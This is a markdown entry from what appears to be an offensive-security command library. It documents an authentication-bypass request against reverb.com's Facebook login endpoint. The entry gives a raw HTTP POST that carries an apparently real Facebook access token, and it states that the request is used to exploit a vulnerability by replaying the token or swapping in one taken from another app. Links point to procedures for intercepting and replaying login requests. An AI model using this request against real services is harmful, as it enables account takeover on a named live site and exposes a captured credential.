---
data: >-
  POST /api/auth/facebook HTTP/1.1

  Host: reverb.com

  {"fb_token":"EAAJ8Of8DF2IBAL5wChKjuRHSV2VEWpm7eCz2IMqqJy1lJJq8ooyQuKHcOXn6aZCZAIrCtClbrZBdUGhC3FbvncNYk1E0k7AOktEhDjUPwHPOh3x29JURSGIGPBlZCj5WlBHhHzI5KYAPbuXKiZBGTkKZABZATh9JjTqEDhRubYSEiTmhjeytx5moFH9naZB6XjZBRUMkmcbucFD9Vf8IoFZAD1LGngi6j5pXFGcTFPfBEudAZDZD"}
tags:
  - http-post
  - authentication
type: command
executor: bash
platforms:
  - Web
id: 3345448e-7dc0-4532-800b-74e78e77e7dd
created_at: '2025-12-11T06:10:15.366Z'
updated_at: '2025-12-11T06:10:15.366Z'
verified: false
validated: true
submitted: true
---
# reverb-facebook-login-post

## Command

```bash
POST /api/auth/facebook HTTP/1.1
Host: reverb.com
{"fb_token":"EAAJ8Of8DF2IBAL5wChKjuRHSV2VEWpm7eCz2IMqqJy1lJJq8ooyQuKHcOXn6aZCZAIrCtClbrZBdUGhC3FbvncNYk1E0k7AOktEhDjUPwHPOh3x29JURSGIGPBlZCj5WlBHhHzI5KYAPbuXKiZBGTkKZABZATh9JjTqEDhRubYSEiTmhjeytx5moFH9naZB6XjZBRUMkmcbucFD9Vf8IoFZAD1LGngi6j5pXFGcTFPfBEudAZDZD"}
```

## Description

Sends a POST request to the Facebook authentication endpoint on reverb.com with a JSON body containing a fb_token to attempt login. This command is used to demonstrate or exploit the vulnerability by replaying or modifying the token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `fb_token` | The Facebook access token used for authentication, which can be from any app | Yes |

## Examples

### Basic Usage

```bash
POST /api/auth/facebook HTTP/1.1
Host: reverb.com
{"fb_token":"EAAJ8Of8DF2IBAL5wChKjuRHSV2VEWpm7eCz2IMqqJy1lJJq8ooyQuKHcOXn6aZCZAIrCtClbrZBdUGhC3FbvncNYk1E0k7AOktEhDjUPwHPOh3x29JURSGIGPBlZCj5WlBHhHzI5KYAPbuXKiZBGTkKZABZATh9JjTqEDhRubYSEiTmhjeytx5moFH9naZB6XjZBRUMkmcbucFD9Vf8IoFZAD1LGngi6j5pXFGcTFPfBEudAZDZD"}
```

### Advanced Usage

```bash
POST /api/auth/facebook HTTP/1.1
Host: reverb.com
{"fb_token":"[MODIFIED_TOKEN_FROM_OTHER_APP]"}
```

## Expected Output

Successful authentication response, including session tokens or cookies for the authenticated user.

## Related

- [[procedures/Intercept-and-Replay-Facebook-Login-Request]]
- [[procedures/Replace-Access-Token-for-Authentication-Bypass]]
